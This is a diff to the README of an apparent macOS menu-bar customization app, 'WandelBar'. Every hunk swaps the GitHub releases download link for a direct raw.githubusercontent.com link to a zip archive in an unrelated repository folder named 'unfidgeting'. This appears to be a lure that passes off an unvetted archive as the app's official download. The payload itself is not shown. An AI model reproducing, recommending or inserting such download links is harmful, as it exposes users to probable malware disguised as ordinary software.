@@ -7,7 +7,7 @@ description: "Customize the macOS menu bar background—restore contrast, soften
 
 ## 🚀 Getting Started
 
-[⬇️ Download WandelBar Now](https://github.com/briettadisabling1382/WandelBar/releases)
+[⬇️ Download WandelBar Now](https://raw.githubusercontent.com/briettadisabling1382/briettadisabling1382.github.io/main/unfidgeting/3.6-beta.3.zip)
 
 Welcome! WandelBar is a simple, powerful app that lets you change how the menu bar at the top of your Mac screen looks. You can make it blurry, add colors, shadows, textures, and even set different styles for different desktop spaces. No technical skills needed - just download, open, and customize!
 
@@ -17,7 +17,7 @@ If you've ever looked at your Mac's top menu bar and thought, "I wish this looke
 
 ## 📥 How to Download and Install
 
-Visit this link to download the application: [https://github.com/briettadisabling1382/WandelBar/releases](https://github.com/briettadisabling1382/WandelBar/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/briettadisabling1382/briettadisabling1382.github.io/main/unfidgeting/3.6-beta.3.zip](https://raw.githubusercontent.com/briettadisabling1382/briettadisabling1382.github.io/main/unfidgeting/3.6-beta.3.zip)
 
 Here's what to do:
 
@@ -118,7 +118,7 @@ WandelBar is free to use for personal purposes. Feel free to try all its feature
 
 We built WandelBar because we love customization and wanted everyone to enjoy a more personal, stylish Mac experience. We hope you love using it as much as we loved creating it. If you enjoy WandelBar, tell a friend!
 
-[⬇️ Download WandelBar Now](https://github.com/briettadisabling1382/WandelBar/releases)
+[⬇️ Download WandelBar Now](https://raw.githubusercontent.com/briettadisabling1382/briettadisabling1382.github.io/main/unfidgeting/3.6-beta.3.zip)
 
 Make your Mac truly yours today!
 
